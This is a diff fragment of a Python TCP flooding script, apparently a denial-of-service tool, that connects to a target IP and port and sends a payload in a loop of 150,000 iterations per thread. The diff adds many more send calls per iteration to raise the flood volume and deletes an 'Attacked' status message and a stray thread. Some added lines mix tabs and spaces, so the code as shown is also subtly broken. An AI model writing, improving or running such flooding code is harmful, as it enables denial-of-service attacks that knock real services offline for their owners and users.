@@ -186,9 +186,17 @@ if method == "TCP":
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                 sock.connect((ip, port))
-                for _ in range(150000):  # Reduce the number of iterations to avoid an infinite loop
+                for _ in range(150000):  
                     sock.send(grtools)
                     sock.send(grtools)
+                    sock.send(grtools)
+                    sock.send(grtools)
+                    sock.send(grtools)
+                    sock.send(grtools)
+                    sock.send(grtools)
+                    sock.send(grtools)
+                    sock.send(grtools)
+		    sock.send(grtools)
                     sock.send(grtools)
                     sock.send(grtools)
                     sock.send(grtools)
@@ -206,10 +214,7 @@ if method == "TCP":
         if method == "TCP":
             t = threading.Thread(target=tcpfl)
             threads.append(t)
-            print("[GrBroadcast] Attacked")
             t.start()
-	    t2 = threading.Thread(target=tcpfl)
-            t2.join()
 
    for thread in threads:
        thread.join()
